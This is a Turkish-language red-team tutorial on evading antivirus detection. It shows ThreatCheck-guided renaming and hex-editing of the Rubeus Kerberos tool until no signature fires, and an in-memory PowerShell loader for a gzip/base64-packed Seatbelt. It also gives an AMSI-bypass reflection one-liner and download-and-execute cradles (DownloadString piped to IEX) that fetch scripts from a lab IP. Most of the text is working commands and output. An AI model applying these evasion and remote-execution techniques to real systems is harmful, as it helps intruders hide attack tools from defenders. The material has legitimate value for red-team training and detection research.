# Open Source Software

## Manually Breaking Signatures

### Rubeus

* Console App (.NET Framework 4.8)
* Release, Any CPU
* Rubeus.sln

### Rubeus Obfuscation

Rubeus proje klasörünü Rubeus2 olarak kopyala:

```pwsh
PS C:\Users\Administrator> Copy-Item -Recurse C:\Tools\Rubeus C:\Tools\Rubeus2
```

Rubeus2 klasörü içerisinde bulunan Rubeus.sln dosyasını Microsoft Visual Studio programı ile aç.

Eğer Target framework not supported uyarısı çıkarsa aşağıda verilen seçeneği onaylayarak devam et:

* [x] Update the target to .NET Framework 4.8 (Recommended)
* [ ] Download .NET Framework 4.0 targeting pack (opens in browser)
* [ ] Do not load this project

Projeyi derle.

Ardından ThreatCheck ile bir kontrol gerçekleştir:

```pwsh
PS C:\Users\Administrator> C:\Tools\ThreatCheck-master\ThreatCheck\ThreatCheck\bin\x64\Release\ThreatCheck.exe -f C:\Tools\Rubeus2\Rubeus\bin\Release\Rubeus.exe
```

```hexdump title="Output" hl_lines="7"
[+] Target file size: 462848 bytes
[+] Analyzing...
[!] Identified end of bad bytes at offset 0x4A9F7
00000000   74 41 64 64 72 65 73 73  00 5F 70 72 69 6E 74 5F   tAddress·_print_
00000010   61 64 64 72 65 73 73 00  63 72 6F 73 73 00 75 73   address·cross·us
00000020   65 72 53 74 61 74 73 00  47 65 74 41 44 4F 62 6A   erStats·GetADObj
00000030   65 63 74 73 00 46 6F 72  67 65 54 69 63 6B 65 74   ects·ForgeTicket
00000040   73 00 45 6E 75 6D 65 72  61 74 65 54 69 63 6B 65   s·EnumerateTicke
00000050   74 73 00 50 61 72 73 65  53 61 76 65 54 69 63 6B   ts·ParseSaveTick
00000060   65 74 73 00 73 61 76 65  54 69 63 6B 65 74 73 00   ets·saveTickets·
00000070   43 6F 75 6E 74 4F 66 54  69 63 6B 65 74 73 00 48   CountOfTickets·H
00000080   61 72 76 65 73 74 54 69  63 6B 65 74 47 72 61 6E   arvestTicketGran
00000090   74 69 6E 67 54 69 63 6B  65 74 73 00 77 72 61 70   tingTickets·wrap
000000A0   54 69 63 6B 65 74 73 00  64 69 73 70 6C 61 79 4E   Tickets·displayN
000000B0   65 77 54 69 63 6B 65 74  73 00 72 65 6E 65 77 54   ewTickets·renewT
000000C0   69 63 6B 65 74 73 00 67  65 74 5F 61 64 64 69 74   ickets·get_addit
000000D0   69 6F 6E 61 6C 5F 74 69  63 6B 65 74 73 00 73 65   ional_tickets·se
000000E0   74 5F 61 64 64 69 74 69  6F 6E 61 6C 5F 74 69 63   t_additional_tic
000000F0   6B 65 74 73 00 67 65 74  5F 74 69 63 6B 65 74 73   kets·get_tickets
```

Görünüşe göre Ticket kelimesi soruna sebep oluyor.

Şimdi Find and Replace özelliğini kullanarak ticket, tekcit değişimi gerçekleştir:

| FIND | REPLACE |
|---|---|
| ticket | tekcit |

Projeyi derle.

Ardından ThreatCheck ile bir kontrol gerçekleştir:

```pwsh
PS C:\Users\Administrator> C:\Tools\ThreatCheck-master\ThreatCheck\ThreatCheck\bin\x64\Release\ThreatCheck.exe -f C:\Tools\Rubeus2\Rubeus\bin\Release\Rubeus.exe
```

```hexdump title="Output" hl_lines="18-19"
[+] Target file size: 462848 bytes
[+] Analyzing...
[!] Identified end of bad bytes at offset 0x4C230
00000000   65 61 74 65 53 75 62 4B  65 79 00 4F 70 65 6E 53   eateSubKey·OpenS
00000010   75 62 4B 65 79 00 67 65  74 5F 50 75 62 6C 69 63   ubKey·get_Public
00000020   4B 65 79 00 45 6E 63 6F  64 65 50 75 62 6C 69 63   Key·EncodePublic
00000030   4B 65 79 00 50 61 72 73  65 50 75 62 6C 69 63 4B   Key·ParsePublicK
00000040   65 79 00 6F 74 68 65 72  50 75 62 6C 69 63 4B 65   ey·otherPublicKe
00000050   79 00 67 65 74 5F 53 75  62 6A 65 63 74 50 75 62   y·get_SubjectPub
00000060   6C 69 63 4B 65 79 00 73  65 74 5F 53 75 62 6A 65   licKey·set_Subje
00000070   63 74 50 75 62 6C 69 63  4B 65 79 00 73 75 62 6A   ctPublicKey·subj
00000080   65 63 74 50 75 62 6C 69  63 4B 65 79 00 70 75 62   ectPublicKey·pub
00000090   6C 69 63 4B 65 79 00 65  6E 63 4B 65 79 00 73 65   licKey·encKey·se
000000A0   72 76 69 63 65 4B 65 79  00 49 45 78 63 68 61 6E   rviceKey·IExchan
000000B0   67 65 4B 65 79 00 47 65  6E 65 72 61 74 65 4B 65   geKey·GenerateKe
000000C0   79 00 67 65 74 5F 50 72  69 76 61 74 65 4B 65 79   y·get_PrivateKey
000000D0   00 53 65 74 50 69 6E 46  6F 72 50 72 69 76 61 74   ·SetPinForPrivat
000000E0   65 4B 65 79 00 52 61 6E  64 6F 6D 4B 65 79 00 44   eKey·RandomKey·D
000000F0   69 66 66 69 65 48 65 6C  6C 6D 61 6E 4B 65 79 00   iffieHellmanKey·
```

Görünüşe göre Key kelimesi soruna sebep oluyor.

Bu aşamada Find and Replace özelliğini kullanmak ContainsKey gibi built-in fonksiyonları bozabilir.

Farklı olarak Find in Files özelliğini kullanarak çıktıda gözüken DiffieHellmanKey kelimesi için bir arama gerçekleştir:

| FIND |
|---|
| DiffieHellmanKey |

Bulunan DiffieHellmanKey.cs dosyasında DiffieHellmanKey sınıfına ulaş.

Şimdi Rename özelliğini kullanarak DiffieHellmanKey, DHK değişimi gerçekleştir:

| RENAME |
|---|
| DHK |

Projeyi derle.

Ardından ThreatCheck ile bir kontrol gerçekleştir:

```pwsh
PS C:\Users\Administrator> C:\Tools\ThreatCheck-master\ThreatCheck\ThreatCheck\bin\x64\Release\ThreatCheck.exe -f C:\Tools\Rubeus2\Rubeus\bin\Release\Rubeus.exe
```

```hexdump title="Output" hl_lines="17-19"
[+] Target file size: 462848 bytes
[+] Analyzing...
[!] Identified end of bad bytes at offset 0x6F50E
00000000   00 11 84 24 05 28 00 12  80 C9 05 28 00 11 80 F5   ··?$·(··?É·(··?o
00000010   05 28 00 11 82 64 05 28  00 11 82 68 05 28 00 11   ·(··?d·(··?h·(··
00000020   82 6C 05 28 00 11 82 70  05 28 00 11 84 38 05 28   ?l·(··?p·(··?8·(
00000030   00 12 81 29 05 28 00 11  81 D0 09 28 00 15 11 7D   ··?)·(··?D·(···}
00000040   01 11 81 D4 03 28 00 06  05 28 00 11 81 B4 05 28   ··?O·(···(··?'·(
00000050   00 11 82 C4 05 28 00 11  83 E0 07 28 00 15 11 7D   ··?Ä·(··?à·(···}
00000060   01 06 05 28 00 11 83 F4  09 28 00 15 12 80 C1 02   ···(··?ô·(···?A·
00000070   0E 0E 03 08 00 0E 06 28  00 1D 12 83 68 08 01 00   ·······(···?h···
00000080   08 00 00 00 00 00 1E 01  00 01 00 54 02 16 57 72   ···········T··Wr
00000090   61 70 4E 6F 6E 45 78 63  65 70 74 69 6F 6E 54 68   apNonExceptionTh
000000A0   72 6F 77 73 01 08 01 00  02 00 00 00 00 00 0B 01   rows············
000000B0   00 06 52 75 62 65 75 73  00 00 05 01 00 00 00 00   ··Rubeus········
000000C0   17 01 00 12 43 6F 70 79  72 69 67 68 74 20 C2 A9   ····Copyright Ac
000000D0   20 20 32 30 31 38 00 00  29 01 00 24 36 35 38 63     2018··)··$658c
000000E0   38 62 37 66 2D 33 36 36  34 2D 34 61 39 35 2D 39   8b7f-3664-4a95-9
000000F0   35 37 32 2D 61 33 65 35  38 37 31 64 66 63 30 36   572-a3e5871dfc06
```

Görünüşe göre mevcut [GUID](https://www.techtarget.com/searchwindowsserver/definition/GUID-global-unique-identifier) değeri soruna sebep oluyor.

Öncelikle yeni bir GUID değeri oluştur:

```pwsh
PS C:\Users\Administrator> [System.Guid]::NewGuid()
```

```output title="Output"
Guid
----
fb05532f-bbfb-4c57-82cd-5fc7c48733e4
```

Proje ayarlarında değişiklik yapmak için aşağıda verilen yolu takip et:

* Project
* Rubeus Properties
* Application
* Assembly Information

Açılan pencerede GUID değerini değiştir:

| GUID |
|---|
| fb05532f-bbfb-4c57-82cd-5fc7c48733e4 |

Projeyi derle.

Ardından ThreatCheck ile bir kontrol gerçekleştir:

```pwsh
PS C:\Users\Administrator> C:\Tools\ThreatCheck-master\ThreatCheck\ThreatCheck\bin\x64\Release\ThreatCheck.exe -f C:\Tools\Rubeus2\Rubeus\bin\Release\Rubeus.exe
```

```hexdump title="Output" hl_lines="18"
[+] Target file size: 462848 bytes
[+] Analyzing...
[!] Identified end of bad bytes at offset 0x6F71F
00000000   72 2E 4D 49 44 4C 5F 53  45 52 56 45 52 5F 49 4E   r.MIDL_SERVER_IN
00000010   46 4F 33 32 00 00 24 01  00 1F 52 75 62 65 75 73   FO32··$···Rubeus
00000020   2E 4E 64 72 2E 52 50 43  5F 44 49 53 50 41 54 43   .Ndr.RPC_DISPATC
00000030   48 5F 54 41 42 4C 45 33  32 00 00 26 01 00 21 52   H_TABLE32··&··!R
00000040   75 62 65 75 73 2E 4E 64  72 2E 52 50 43 5F 50 52   ubeus.Ndr.RPC_PR
00000050   4F 54 53 45 51 5F 45 4E  44 50 4F 49 4E 54 33 32   OTSEQ_ENDPOINT32
00000060   00 00 26 01 00 21 52 75  62 65 75 73 2E 4E 64 72   ··&··!Rubeus.Ndr
00000070   2E 52 50 43 5F 53 45 52  56 45 52 5F 49 4E 54 45   .RPC_SERVER_INTE
00000080   52 46 41 43 45 33 32 00  00 1F 01 00 1A 52 75 62   RFACE32······Rub
00000090   65 75 73 2E 4E 64 72 2E  4E 44 52 5F 45 58 50 52   eus.Ndr.NDR_EXPR
000000A0   5F 44 45 53 43 33 32 00  00 F0 14 07 00 00 00 00   _DESC32··d······
000000B0   00 00 00 00 00 0A 15 07  00 00 20 00 00 00 00 00   ·········· ·····
000000C0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
000000D0   00 FC 14 07 00 00 00 00  00 00 00 00 00 00 00 5F   ·ü·············_
000000E0   43 6F 72 45 78 65 4D 61  69 6E 00 6D 73 63 6F 72   CorExeMain·mscor
000000F0   65 65 2E 64 6C 6C 00 00  00 00 00 FF 25 00 20 40   ee.dll·····ÿ%· @
```

Görünüşe göre CorExeMain kelimesi soruna sebep oluyor.

Bu aşamada Find in Files özelliğini kullanmak bir işe yaramaz.

Farklı olarak Rubeus.exe dosyasını [HxD](https://mh-nexus.de/en/hxd/) içerisinde açarak bir arama gerçekleştir:

* Search
* Find
* Hex-values
* Search for: 69 6E 00 6D 73 63 6F 72

Arama sonucu aşağıdaki gibidir:

```hexdump title="Rubeus.exe"
0006F6E0   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ················
0006F6F0   FC 14 07 00 00 00 00 00 00 00 00 00 00 00 5F 43    ü·············_C
0006F700   6F 72 45 78 65 4D 61 69 6E 00 6D 73 63 6F 72 65    orExeMain·mscore
0006F710   65 2E 64 6C 6C 00 00 00 00 00 FF 25 00 20 40 00    e.dll·····ÿ%· @·
```

Şimdi çıktı üzerinde CorExeMain, cOReXEmAIN değişimi gerçekleştir:

```hexdump title="Rubeus.exe"
0006F6E0   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ················
0006F6F0   FC 14 07 00 00 00 00 00 00 00 00 00 00 00 5F 43    ü·············_c
0006F700   6F 72 45 78 65 4D 61 69 6E 00 6D 73 63 6F 72 65    OReXEmAIN·mscore
0006F710   65 2E 64 6C 6C 00 00 00 00 00 FF 25 00 20 40 00    e.dll·····ÿ%· @·
```

Dosyayı kaydet.

Ardından ThreatCheck ile bir kontrol gerçekleştir:

```pwsh
PS C:\Users\Administrator> C:\Tools\ThreatCheck-master\ThreatCheck\ThreatCheck\bin\x64\Release\ThreatCheck.exe -f C:\Tools\Rubeus2\Rubeus\bin\Release\Rubeus.exe
```

```output title="Output"
[+] No threat found!
```

## Loading Assemblies in PowerShell

### Seatbelt

* Console App (.NET Framework 4.8)
* Release, Any CPU
* Seatbelt.sln

### Seatbelt Obfuscation

Seatbelt proje klasörünü Seatbelt2 olarak kopyala:

```pwsh
PS C:\Users\Administrator> Copy-Item -Recurse C:\Tools\Seatbelt C:\Tools\Seatbelt2
```

Seatbelt2 klasörü içerisinde bulunan Seatbelt.sln dosyasını Microsoft Visual Studio programı ile aç.

PowerShell yardımı ile Main fonksiyonuna erişebilmek için private, public değişimi gerçekleştir:

```cs title="Program.cs" linenums="1" hl_lines="7"
using System;

namespace Seatbelt
{
    public static class Program
    {
        public static void Main(string[] args)
        {
            try
            {
                using var sb = (new Seatbelt(args));
                sb.Start();
            }
            catch (Exception e)
            {
                Console.WriteLine($"Unhandled terminating exception: {e}");
            }
        }
    }
}
```

Projeyi derle.

Aşağıda verilen dosyayı CyberChef üzerinde aç:

```text title="Open file as input"
C:\Tools\Seatbelt2\Seatbelt\bin\Release\Seatbelt.exe
```

Aşağıda verilen CyberChef tarifini kullanarak yeni bir payload pişir:

1. Gzip
    * Compression type: Dynamic Huffman Coding
2. To Base64
    * Alphabet: A-Za-z0-9+/=

### Script

```powershell title="Invoke-Seatbelt.ps1" linenums="1" hl_lines="9"
function Invoke-Seatbelt {
    [CmdletBinding()]
    Param (
        [System.String]
        $args = " "
    )

    # Sealbelt.exe -> Gzip -> Base64
    $buffer = "";

    $gzipBytes = [Convert]::FromBase64String($buffer);

    $gzipMemoryStream = New-Object System.IO.MemoryStream(, $gzipBytes);
    $gzipStream = New-Object System.IO.Compression.GzipStream($gzipMemoryStream, [System.IO.Compression.CompressionMode]::Decompress);
    $seatbeltMemoryStream = New-Object System.IO.MemoryStream;
    $gzipStream.CopyTo($seatbeltMemoryStream);

    $seatbeltArray = $seatbeltMemoryStream.ToArray();
    $seatbelt = [System.Reflection.Assembly]::Load($seatbeltArray);

    $oldConsoleOut = [System.Console]::Out;
    $stringWriter = New-Object System.IO.StringWriter;
    [System.Console]::SetOut($stringWriter);

    [Seatbelt.Program]::Main($args.Split(" "));

    [System.Console]::SetOut($oldConsoleOut);
    $results = $stringWriter.ToString();
    $results;
}
```

### Understanding the Script

Seatbelt aracına verilecek argümanları tutmak için bir parametre oluşturulur:

```powershell title="Invoke-Seatbelt.ps1" linenums="2"
[CmdletBinding()]
Param (
    [System.String]
    $args = " "
)
```

Payload, Gzip formatına çözülür:

```powershell title="Invoke-Seatbelt.ps1" linenums="11"
$gzipBytes = [Convert]::FromBase64String($buffer);
```

Gzip, orijinal Seatbelt.exe dosyasına çözülür:

```powershell title="Invoke-Seatbelt.ps1" linenums="13"
$gzipMemoryStream = New-Object System.IO.MemoryStream(, $gzipBytes);
$gzipStream = New-Object System.IO.Compression.GzipStream($gzipMemoryStream, [System.IO.Compression.CompressionMode]::Decompress);
$seatbeltMemoryStream = New-Object System.IO.MemoryStream;
$gzipStream.CopyTo($seatbeltMemoryStream);
```

Assembly yükleme işlemi tamamlanır:

```powershell title="Invoke-Seatbelt.ps1" linenums="18"
$seatbeltArray = $seatbeltMemoryStream.ToArray();
$seatbelt = [System.Reflection.Assembly]::Load($seatbeltArray);
```

STDOUT, konsol ekranına [yönlendirilir](https://stackoverflow.com/a/33128025):

```powershell title="Invoke-Seatbelt.ps1" linenums="21"
$oldConsoleOut = [System.Console]::Out;
$stringWriter = New-Object System.IO.StringWriter;
[System.Console]::SetOut($stringWriter);
```

Main fonksiyonu çağrılır:

```powershell title="Invoke-Seatbelt.ps1" linenums="25"
[Seatbelt.Program]::Main($args.Split(" "));
```

STDOUT, sıfırlanır:

```powershell title="Invoke-Seatbelt.ps1" linenums="27"
[System.Console]::SetOut($oldConsoleOut);
$results = $stringWriter.ToString();
$results;
```

### AMSI Bypass Methods

#### amsiInitFailed

!!! failure

    Atlatma başarısız oldu.

```pwsh
PS C:\Users\alpha> [ref].Assembly.GetType("System.Management.Automation.Amsi" + "Utils").GetField("amsiInit" + "Failed", "NonPublic,Static").SetValue($null, !$false)
PS C:\Users\alpha> (New-Object System.Net.WebClient).DownloadString("http://10.10.15.35:8000/Invoke-Seatbelt.ps1") | IEX
PS C:\Users\alpha> Invoke-Seatbelt AMSIProviders
```

```output title="Output" hl_lines="4"
Exception calling "Load" with "1" argument(s): "Could not load file or assembly '615936 bytes loaded from Anonymously Hosted DynamicMethods Assembly, Version=0.0.0.0, Culture=neutral,
PublicKeyToken=null' or one of its dependencies. An attempt was made to load a program with an incorrect format."
At line:19 char:5
+     $seatbelt = [System.Reflection.Assembly]::Load($seatbeltArray);
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : BadImageFormatException

Unable to find type [Seatbelt.Program].
At line:25 char:5
+     [Seatbelt.Program]::Main($args.Split(" "));
+     ~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (Seatbelt.Program:TypeName) [], RuntimeException
    + FullyQualifiedErrorId : TypeNotFound
```

#### amsiScanBuffer

!!! success

    Atlatma başarılı oldu.

```pwsh
PS C:\Users\alpha> (New-Object System.Net.WebClient).DownloadString("http://10.10.15.35:8000/Bypass-2.ps1") | IEX
PS C:\Users\alpha> (New-Object System.Net.WebClient).DownloadString("http://10.10.15.35:8000/Invoke-Seatbelt.ps1") | IEX
PS C:\Users\alpha> Invoke-Seatbelt AMSIProviders
```

```output title="Output"
                        %&&@@@&&
                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%
                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
#####%######################  %%%..                       @////(((&%%%%%%%################
                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*
                        &%%&&&%%%%%        v1.2.2         ,(((&%%%%%%%%%%%%%%%%%,
                         #%%%%##,


====== AMSIProviders ======

  GUID                           : {2781761E-28E0-4109-99FE-B9D127C57AFE}
  ProviderPath                   : "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24050.7-0\MpOav.dll"



[*] Completed collection in 0.028 seconds
```
